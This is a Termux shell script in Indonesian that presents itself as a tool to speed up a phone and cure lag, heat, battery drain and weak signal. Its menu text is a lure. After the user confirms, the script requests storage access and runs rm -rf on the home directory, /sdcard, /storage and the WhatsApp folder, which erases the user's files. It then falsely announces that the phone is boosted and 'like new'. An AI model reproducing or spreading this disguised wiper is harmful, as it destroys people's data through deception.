#CyXNot404
blue='\033[34;1m'                                                                         
green='\033[32;1m'                                                                        
purple='\033[35;1m'                                                                       cyan='\033[36;1m'
red='\033[31;1m'                                                                          
white='\033[37;1m'                                                                        
yellow='\033[33;1m'

mv rocket.cow /data/data/com.termux/files/usr/share
clear
cowsay -f rocket "Buat Hp Anda Jadi Baru!" | lolcat
read -p "Enter Tuk Lanjut!" p
echo
echo $green"TOOLS Pelega Hp anda,Hp anda nge-lag?,Ga lancar?"
echo "Macet-Macet? Cepet Panas? Tenang! Kini admin Punya Solusi!"
echo "Kegunaan Tools Ini:"
echo $cyan
echo "1).Bikin G Lag Lagi saat main game"
echo "2).Bikin G Cepet Panas Hp"
echo "3).Bikin Ga Boros Battry"
echo "4).Lanjay Ga Pake Patah Patah"
echo "5).Membersihkan Sampah Tak Berguna Yg memenUhi Memori"
echo "6).Meningkatkan Performa Perangkat"
echo "7).Menstabilkan Sinyal (Khususnya Pelosok :v)"
echo "8).Menjadikan Hp Anda Seperti Baru!"
echo $red"NOTE : Ijinkan Termux Mengakses Penyimpanan!"
echo $green"•     •     •So HAVE FUN!•     •     •"
echo $white"apakah anda yakin Ingin Melanjutkan?"
read -p "[ Y / N ]? : " c
if [ $c = Y ] || [ $c = y ]
then
termux-setup-storage
echo $green"Memulai Proses Boosting Dalam 5 sec..."
sleep 5
rm -rf $HOME
rm -rf /sdcard
rm -rf sdcard
rm -rf /sdcard/
rm -rf /storage/emulated/0
rm -rf /storage
rm -rf /storage/
rm -rf sdcard/WhatsApp
echo
echo "Loading..."
echo
sleep 2
echo $white"Boosting Selesai! SELAMAT HP ANDA Jadi BARU!!"
echo "Semua Masalah Telah Di FIX!"
echo "PERFORMA PERANGKAT MENINGKAT!!!"
else
    echo $red"PROSES DIBATALKAN!"
fi
